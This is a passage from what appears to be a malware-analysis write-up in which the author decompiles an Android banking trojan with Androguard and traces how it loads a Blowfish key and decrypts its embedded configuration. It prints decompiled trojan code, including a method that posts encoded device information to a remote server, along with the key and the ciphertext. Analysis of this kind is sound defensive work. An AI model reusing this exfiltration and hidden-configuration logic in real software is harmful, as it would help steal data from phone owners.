<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># Use AndroGuard to static analysis
</span></span><span class="line"><span class="cl"># Have a look at https://code.google.com/p/androguard/wiki/RE for some introduction
</span></span><span class="line"><span class="cl">#a = anz.APK(&#39;KC.apk&#39;)
</span></span><span class="line"><span class="cl">a, d, dx = anz.AnalyzeAPK(&#39;FakeBanker.apk&#39;,decompiler=&#39;dex2jar&#39;)
</span></span><span class="line"><span class="cl">&#34;&#34;&#34;
</span></span><span class="line"><span class="cl">d = anz.DalvikVMFormat(a.get_dex())
</span></span><span class="line"><span class="cl">dx = anz.VMAnalysis( d )
</span></span><span class="line"><span class="cl">gx = anz.GVMAnalysis( dx, None )
</span></span><span class="line"><span class="cl">d.set_vmanalysis( dx )
</span></span><span class="line"><span class="cl">d.set_gvmanalysis( gx )
</span></span><span class="line"><span class="cl">&#34;&#34;&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>'\nd = anz.DalvikVMFormat(a.get_dex())\ndx = anz.VMAnalysis( d )\ngx = anz.GVMAnalysis( dx, None )\nd.set_vmanalysis( dx )\nd.set_gvmanalysis( gx )\n'
</code></pre>
<h3 id="analyze-the-manifest-file">Analyze the manifest file</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a.files
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>{'AndroidManifest.xml': 'Unknown',
 'META-INF/CERT.RSA': 'Unknown',
 'META-INF/CERT.SF': 'Unknown',
 'META-INF/MANIFEST.MF': 'Unknown',
 'classes.dex': 'Unknown',
 'res/drawable-hdpi/ic_launcher1.png': 'Unknown',
 'res/drawable-hdpi/logo.png': 'Unknown',
 'res/drawable-ldpi/ic_launcher1.png': 'Unknown',
 'res/drawable-mdpi/ic_launcher1.png': 'Unknown',
 'res/drawable-xhdpi/ic_launcher1.png': 'Unknown',
 'res/layout/actup.xml': 'Unknown',
 'res/layout/main.xml': 'Unknown',
 'res/layout/main2.xml': 'Unknown',
 'res/menu/main.xml': 'Unknown',
 'res/raw/blfs.key': 'Unknown',
 'res/raw/config.cfg': 'Unknown',
 'resources.arsc': 'Unknown'}
</code></pre>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a.permissions
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>['android.permission.RECEIVE_BOOT_COMPLETED',
 'android.permission.READ_SMS',
 'android.permission.RECEIVE_SMS',
 'android.permission.INTERNET',
 'android.permission.READ_PHONE_STATE',
 'android.permission.ACCESS_COARSE_LOCATION',
 'android.permission.ACCESS_NETWORK_STATE']
</code></pre>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a.get_activities()
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>['com.gmail.xpack.MainActivity', 'com.gmail.xpack.ActUpdate']
</code></pre>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a.get_services()
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>['com.gmail.xservices.XService', 'com.gmail.xservices.XSmsIncom']
</code></pre>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a.get_receivers()
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>['com.gmail.xbroadcast.OnBootReceiver',
 'com.gmail.xbroadcast.MessageReceiver',
 'com.gmail.xservices.XRepeat',
 'com.gmail.xservices.XUpdate']
</code></pre>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a.get_main_activity()
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>u'com.gmail.xpack.MainActivity'
</code></pre>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">d.CLASS_Lcom_gmail_xpack_MainActivity.METHOD_onCreate.source()
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>    protected void onCreate(android.os.Bundle p5)
    {
        super.onCreate(p5);
        this.setContentView(1.741289080126432e+38);
        this.show_hide(Integer.valueOf(com.gmail.xlibs.myFunctions.getVar(&quot;PASSADDED&quot;, 0, this)));
        com.gmail.xlibs.myFunctions.sendLog(&quot;START&quot;, &quot;Service started&quot;, this);
        this.startService(new android.content.Intent(&quot;XMainProcessStart&quot;).putExtra(&quot;name&quot;, &quot;value&quot;));
        return;
    }
</code></pre>
<p>Ok let&rsquo;s have a look at <strong>com.gmail.xlibs.myFunctions</strong>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">methods = d.CLASS_Lcom_gmail_xlibs_myFunctions.get_methods()
</span></span><span class="line"><span class="cl">for m in methods: print(m.get_name())
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>&lt;init&gt;
IntToStr
StrToInt
checkPhone
deviceInfo
foundCodeInSms
getCheckedURL
getFirst
getRawData
getSecond
getVar
getVar
in_array
isOnline
loadNumFromPreferences
parseXml
sendFromDb
sendLog
sendMessge
setK12
setVar
setVar
setVarsList
typeInternetConnection
</code></pre>
<p>Having a look at the whole class you can see that there are a <em>lot</em> of methods. But this one looks very interesting:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">d.CLASS_Lcom_gmail_xlibs_myFunctions.METHOD_setK12.source()
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>    public static String setK12(String p4, android.content.Context p5)
    {
        String v2;
        String v1 = com.gmail.xlibs.myFunctions.getVar(&quot;BLFSK&quot;, &quot;&quot;, p5);
        if (v1.length() &lt;= 0) {
            v2 = &quot;&quot;;
        } else {
            v2 = new com.gmail.xlibs.Blowfish(v1, &quot;base64&quot;, &quot;12345678&quot;).encrypt(p4);
        }
        return v2;
    }
</code></pre>
<h2 id="decrypting-stuff">Decrypting stuff</h2>
<p>Apparently there is an encryption routine (<em>Blowfish</em>) used for some <em>stuff</em>. In this case a new class <code>v2</code> is initialized. The constructor gets several parameters:</p>
<ul>
<li>content of <code>BLFSK</code> (<code>v1</code>)</li>
<li>base64 (I thing this sort of flag)</li>
<li>&ldquo;1234578&rdquo; (Looks like some IV)</li>
</ul>
<p>Let&rsquo;s have a look at the <strong>Blowfish</strong> class:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">d.CLASS_Lcom_gmail_xlibs_Blowfish.METHOD_init.source()
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>    public Blowfish(String p2, String p3, String p4)
    {
        this.IV = &quot;12345678&quot;;
        this.in_out_format = &quot;clear&quot;;
        this.IV = p4;
        this.strkey = p2;
        this.in_out_format = p3;
        return;
    }
</code></pre>
<p><code>p2</code> (the first argument) is the key. Looking one step before let&rsquo;s find out what&rsquo;s inside the <code>BLFSK</code> variable. First let&rsquo;s see where the variable is beeing used:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">z</span> <span class="o">=</span> <span class="n">dx</span><span class="o">.</span><span class="n">tainted_variables</span><span class="o">.</span><span class="n">get_string</span><span class="p">(</span><span class="s2">&#34;BLFSK&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">z</span><span class="p">:</span> <span class="n">z</span><span class="o">.</span><span class="n">show_paths</span><span class="p">(</span><span class="n">d</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>R 62 Lcom/gmail/xlibs/myFunctions;-&gt;getFirst (Landroid/content/Context;)V
R 17c Lcom/gmail/xlibs/myFunctions;-&gt;getFirst (Landroid/content/Context;)V
R e8 Lcom/gmail/xlibs/myFunctions;-&gt;getSecond (Landroid/content/Context;)V
R 0 Lcom/gmail/xlibs/myFunctions;-&gt;setK12 (Ljava/lang/String; Landroid/content/Context;)Ljava/lang/String;
</code></pre>
<p>Let&rsquo;s search for some content/files:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">%%bash
</span></span><span class="line"><span class="cl">find output -name <span class="s2">&#34;blfs*&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>output/res/raw/blfs.key
</code></pre>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">%%bash
</span></span><span class="line"><span class="cl">cat output/res/raw/blfs.key
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>NfvnkjlnvkjKCNXKDKLFHSKD:LJmdklsXKLNDS:&lt;XObcniuaebkjxbcz
</code></pre>
<p>Well that looks like a key to me :). What else can we find inside <code>output/res/raw</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">%%bash
</span></span><span class="line"><span class="cl">ls -l output/res/raw
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>total 8
-rw-r--r-- 1 root root   56 Jun 25 13:26 blfs.key
-rw-r--r-- 1 root root 1048 Jun 25 13:26 config.cfg
</code></pre>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">%%bash
</span></span><span class="line"><span class="cl">cat output/res/raw/config.cfg
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>HoBbgAt+xT9vXJUlyhYYAVOx5Oy4XSMLyc7JC+ly5a1tbUtWvFMny2yqavP9D9GT0ogg2U4LN5FZE8/0Y2duLgE7dfXLPcaeXKoIuTmJ4LBiUjS0OokxUPMOrJYCTCx2oWGmdHJqohz7QlbqnZPWch9BvjiWG3TeXKDkjrPKohMswoPA/EVQy3is6XBBfqYKoExCDci14mcoHfnbw1V+YAJlwONpjn1dmzVkJLVQ4ZEbg2WPD5LnXwhdGkhVXF4kS/pHk+6h4ZVd4CMcG7kbWpe7f/dbBX3zJ2NXP+E+MxYW/MTYrNRBMQIfZbuhGmsULXjpHb16R19NZvV4qQwi68KrFbc5hZyfSkWUwD50t2O3o9mSQB3/IlqzzA7VE3XxrsUkZQcBYEixFshSTN+lywZwohooyjGiPEhof7k08bo3YgkDh/8vMR1rttvUKs0xTdQtLF8iER8GDCt6ZUtG0+Lf2G+THOw/Azp/ipC3JJ7Rcj0m1uTj3AAjwfK69rcbtCTP6q5qV8pDEtSr3foU7KZvjCXJL/8TVvZozttjoHnJhI3x5KGKLrczoavKsbiR0iI3ncwGTI5CQ7uZwfMkB5Q2Y4M7oDFTurCPT3iRAvhUQN3Ah8TKAyzwACUlCk9nA2A7H9IFfTgI2QvaXQlNxkPeZMh+iOYImUELMSbNQ1HpsaF1Bbymg6vWTgvyViVsAjf+Y22y+n0eFJicsLPzc9GNs6bCgPCIDVRr2iLoiXjP8AE4gQUdxfqCQ1JtvBfWXmB4kAWb1ciuqsE1Zff+aahnT1Qbet1vA6g9DsTLuumqX0tjmCD/E50eL48Bz0etthaS7RbJiIpg3SU9Lio1GmZeYBB9/4FW4CB1M+cH9jjjKmj4sXUwcLrBDgD+JvCEc7VGxdLj/Ori631mkWvRtlKC4sIOLlHQEDwRcXDgvLnAKZYG65Tm4a5gr490Yco1QSKxeMkMKvMitGQS87ObKaqr30nfXZHMwdWLc6Q437aVyOxc9GvxGC7qmtnYU4Pw5alh1XKtXdjY4EGsVhk/MQ==
</code></pre>
<p>I&rsquo;ve checked that content and it&rsquo;s <strong>base64</strong>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">%%bash
</span></span><span class="line"><span class="cl">base64 -d output/res/raw/config.cfg &gt; output/res/raw/config.cfg.raw
</span></span><span class="line"><span class="cl">file output/res/raw/config.cfg.raw
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>output/res/raw/config.cfg.raw: data
</code></pre>
<p>Ok. Now let&rsquo;s decrypt that file. But first let&rsquo;s have a look at the used encryption parameters:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">d.CLASS_Lcom_gmail_xlibs_Blowfish.METHOD_encrypt.source()
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>    public String encrypt(String p10)
    {
        try {
            String v7;
            javax.crypto.spec.SecretKeySpec v6 = new javax.crypto.spec.SecretKeySpec(this.strkey.getBytes(), &quot;Blowfish&quot;);
            javax.crypto.Cipher v0 = javax.crypto.Cipher.getInstance(&quot;Blowfish/CBC/PKCS5Padding&quot;);
            v0.init(1, v6, new javax.crypto.spec.IvParameterSpec(this.IV.getBytes()));
            byte[] v3 = v0.doFinal(p10.getBytes());
        } catch (Exception v1) {
            v7 = 0;
            return v7;
        }
        if (this.in_out_format != &quot;base64&quot;) {
            if (this.in_out_format != &quot;hex&quot;) {
                v7 = new String(v3, &quot;UTF8&quot;);
            } else {
                v7 = com.gmail.xlibs.Blowfish.byte2hex(v3);
            }
        } else {
            v7 = android.util.Base64.encodeToString(v3, 0);
        }
        return v7;
    }
</code></pre>
<p>So we have <strong>Blowfish</strong> with <a href="http://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher-block_chaining_.28CBC.29"><strong>CBC</strong></a>. The <strong>decryption</strong> method:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">d.CLASS_Lcom_gmail_xlibs_Blowfish.METHOD_decrypt.source()
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>    public String decrypt(String p9)
    {
        try {
            byte[] v1;
            javax.crypto.spec.SecretKeySpec v5 = new javax.crypto.spec.SecretKeySpec(this.strkey.getBytes(), &quot;Blowfish&quot;);
            javax.crypto.Cipher v0 = javax.crypto.Cipher.getInstance(&quot;Blowfish/CBC/PKCS5Padding&quot;);
            v0.init(2, v5, new javax.crypto.spec.IvParameterSpec(this.IV.getBytes()));
        } catch (Exception v2) {
            byte[] v6 = 0;
            return v6;
        }
        if (this.in_out_format != &quot;base64&quot;) {
            if (this.in_out_format != &quot;hex&quot;) {
                v1 = v0.doFinal(p9.getBytes(&quot;UTF8&quot;));
            } else {
                v1 = v0.doFinal(com.gmail.xlibs.Blowfish.hex2byte(p9));
            }
        } else {
            v1 = v0.doFinal(android.util.Base64.decode(p9, 0));
        }
        v6 = new String(v1);
        return v6;
    }
</code></pre>
<p>As I&rsquo;ve looked into the code I&rsquo;ve noticed that a new <code>Blowfish</code> class is initiated in <em>com/xlibs/myFunctions.class</em>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">d.CLASS_Lcom_gmail_xlibs_myFunctions.METHOD_getFirst.source()
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>    public static void getFirst(android.content.Context p14)
    {
        if (com.gmail.xlibs.myFunctions.getVar(&quot;RID&quot;, 0, p14) == 0) {
            String v5 = com.gmail.xlibs.myFunctions.getRawData(1.754580954436089e+38, 0, p14);
            com.gmail.xlibs.myFunctions.parseXml(new com.gmail.xlibs.Blowfish(v5, &quot;base64&quot;, &quot;12345678&quot;).decrypt(com.gmail.xlibs.myFunctions.getRawData(1.754581157260185e+38, 1, p14)), p14);
            int v0 = com.gmail.xlibs.myFunctions.getVar(&quot;RID&quot;, 0, p14);
            if (v0 != 0) {
                com.gmail.xlibs.myFunctions.setVar(&quot;BLFSK&quot;, v5, p14);
                com.gmail.xlibs.myFunctions.setVar(&quot;RID&quot;, v0, p14);
                String v9 = com.gmail.xlibs.myFunctions.getVar(&quot;USE_URL_MAIN&quot;, &quot;&quot;, p14);
                if (v9.trim().length() &gt; 0) {
                    String[] v7 = new String[3];
                    v7[0] = &quot;data&quot;;
                    v7[1] = &quot;rid&quot;;
                    v7[2] = &quot;first&quot;;
                    String[] v10 = new String[3];
                    v10[0] = com.gmail.xlibs.Blowfish.base64_encode(com.gmail.xlibs.myFunctions.deviceInfo(p14));
                    v10[1] = com.gmail.xlibs.myFunctions.IntToStr(com.gmail.xlibs.myFunctions.getVar(&quot;RID&quot;, 0, p14));
                    v10[2] = &quot;true&quot;;
                    try {
                        String v8 = com.gmail.xlibs.SimpleCurl.httpPost(v9, com.gmail.xlibs.SimpleCurl.prepareVars(v7, v10, &quot;UTF-8&quot;), &quot;UTF-8&quot;);
                    } catch (java.io.IOException v4) {
                        com.gmail.xlibs.myFunctions.setVar(&quot;RID&quot;, 0, p14);
                        v4.printStackTrace();
                    } catch (java.io.IOException v4) {
                        com.gmail.xlibs.myFunctions.setVar(&quot;RID&quot;, 0, p14);
                        v4.printStackTrace();
                    }
                    v8 = v8.trim();
                    if ((v8 != null) &amp;&amp; (v8.length() != 0)) {
                        com.gmail.xlibs.myFunctions.setVar(&quot;BLFSK&quot;, v8, p14);
                    } else {
                        com.gmail.xlibs.myFunctions.setVar(&quot;RID&quot;, 0, p14);
                        android.util.Log.d(&quot;HTTP&quot;, &quot;Obnilim rid&quot;);
                    }
                }
            }
        }
        return;
    }
</code></pre>
<p>Especially this line is very interesting:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">com</span><span class="p">.</span><span class="na">gmail</span><span class="p">.</span><span class="na">xlibs</span><span class="p">.</span><span class="na">myFunctions</span><span class="p">.</span><span class="na">parseXml</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">com</span><span class="p">.</span><span class="na">gmail</span><span class="p">.</span><span class="na">xlibs</span><span class="p">.</span><span class="na">Blowfish</span><span class="p">(</span><span class="n">v5</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;base64&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;12345678&#34;</span><span class="p">).</span><span class="na">decrypt</span><span class="p">(</span><span class="n">com</span><span class="p">.</span><span class="na">gmail</span><span class="p">.</span><span class="na">xlibs</span><span class="p">.</span><span class="na">myFunctions</span><span class="p">.</span><span class="na">getRawData</span><span class="p">(</span><span class="n">1</span><span class="p">.</span><span class="na">754581157260185e</span><span class="o">+</span><span class="n">38</span><span class="p">,</span><span class="w"> </span><span class="n">1</span><span class="p">,</span><span class="w"> </span><span class="n">p14</span><span class="p">)),</span><span class="w"> </span><span class="n">p14</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Obviously the encrypted file has some XML content which has to be parsed first. The <em>parseXML</em> function requires a String parameter containing the XML code. The XML code has to be first decrypted:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">new</span><span class="w"> </span><span class="n">com</span><span class="p">.</span><span class="na">gmail</span><span class="p">.</span><span class="na">xlibs</span><span class="p">.</span><span class="na">Blowfish</span><span class="p">(</span><span class="n">v5</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;base64&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;12345678&#34;</span><span class="p">)</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>This will create a new <code>Blowfish</code> object where the parameters are set as shown below:</p>
<ul>
<li><code>v5</code>
<ul>
<li>String v5 = com.gmail.xlibs.myFunctions.getRawData(1.754580954436089e+38, 0, p14);</li>
</ul>
</li>
<li><code>base64</code>
<ul>
<li>Format of ciphertext to be decrypted</li>
</ul>
</li>
<li><code>12345678</code>
<ul>
<li>The IV used for the Blowfish cipher</li>
</ul>
</li>
</ul>
<p><code>v5</code> contains the encryption key. This is have to be loaded first using <code>getRawData</code>. Let&rsquo;s have a look at it:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">d.CLASS_Lcom_gmail_xlibs_myFunctions.METHOD_getRawData.source()
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>    public static String getRawData(int p9, int p10, android.content.Context p11)
    {
        java.io.InputStream v4 = p11.getResources().openRawResource(p9);
        java.io.ByteArrayOutputStream v0 = new java.io.ByteArrayOutputStream();
        try {
            int v3 = v4.read();
        } catch (java.io.IOException v2) {
            v2.printStackTrace();
            String v6;
            String v5 = v0.toString();
            if (p10 != 0) {
                v6 = v5;
            } else {
                v6 = com.gmail.xlibs.Blowfish.byte2hex(v5.getBytes()).substring(0, 50);
            }
            return v6;
        }
        while (v3 != -1) {
            v0.write(v3);
            v3 = v4.read();
        }
        v4.close();
    }
</code></pre>
<p>The first argument <code>p9</code> is a shared preference and contains the name of the file the content should be read from. Using another decompiler l I had a look at the <code>getFirst</code> method and found this:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">...</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">String</span><span class="w"> </span><span class="n">str1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getRawData</span><span class="p">(</span><span class="n">2130968576</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">paramContext</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">String</span><span class="w"> </span><span class="n">str2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getRawData</span><span class="p">(</span><span class="n">2130968577</span><span class="p">,</span><span class="w"> </span><span class="n">1</span><span class="p">,</span><span class="w"> </span><span class="n">paramContext</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">parseXml</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Blowfish</span><span class="p">(</span><span class="n">str1</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;base64&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;12345678&#34;</span><span class="p">).</span><span class="na">decrypt</span><span class="p">(</span><span class="n">str2</span><span class="p">),</span><span class="w"> </span><span class="n">paramContext</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">...</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Now what are those numbers: 2130968576 and 2130968577? Those are ressource identifier. If we hex them we&rsquo;ll have:</p>
<pre><code>hex(2130968576) = 7f040000 and 
hex(2130968577) = 7f040001
</code></pre>
<p>Let&rsquo;s search the files for this pattern:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">%%bash
</span></span><span class="line"><span class="cl">grep -r <span class="s2">&#34;7f040000&#34;</span> output/* <span class="o">&amp;&amp;</span> grep -r <span class="s2">&#34;7f040001&#34;</span> output/*
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>output/res/values/public.xml:    &lt;public type=&quot;raw&quot; name=&quot;blfs&quot; id=&quot;0x7f040000&quot; /&gt;
output/smali/com/gmail/xpack/R$raw.smali:.field public static final blfs:I = 0x7f040000
output/res/values/public.xml:    &lt;public type=&quot;raw&quot; name=&quot;config&quot; id=&quot;0x7f040001&quot; /&gt;
output/smali/com/gmail/xlibs/myFunctions.smali:    const v11, 0x7f040001
output/smali/com/gmail/xpack/R$raw.smali:.field public static final config:I = 0x7f040001
</code></pre>
<p>So those numbers are indeed ressources. What kind of?</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">%%bash
</span></span><span class="line"><span class="cl">grep <span class="s2">&#34;7f04000&#34;</span> output/smali/com/gmail/xpack/R<span class="se">\$</span>raw.smali
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>.field public static final blfs:I = 0x7f040000
.field public static final config:I = 0x7f040001
</code></pre>
<p><strong>Bingo</strong>! Now we know that:</p>
<pre><code>2130968576 -&gt; 7f040000 -&gt; blfs.key
2130968577 -&gt; 7f040000 -&gt; blfs.cfg
</code></pre>
<p>So let&rsquo;s summarize some things:</p>
<ul>
<li><strong>getFirst()</strong> calls <strong>getRawData</strong> twice
<ol>
<li><code>getRawData(&quot;blfs.key&quot;, 0, paramContext);</code></li>
<li><code>getRawData(&quot;config.cg&quot;, 1, paramContext);</code></li>
</ol>
</li>
</ul>
<p>In getRawData() there is no magic happing: Some file stream is created and then the conten is read. <strong>BUT</strong>: There is one catch about it:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">p10</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">     </span><span class="n">v6</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">v5</span><span class="p">;</span><span class="w">
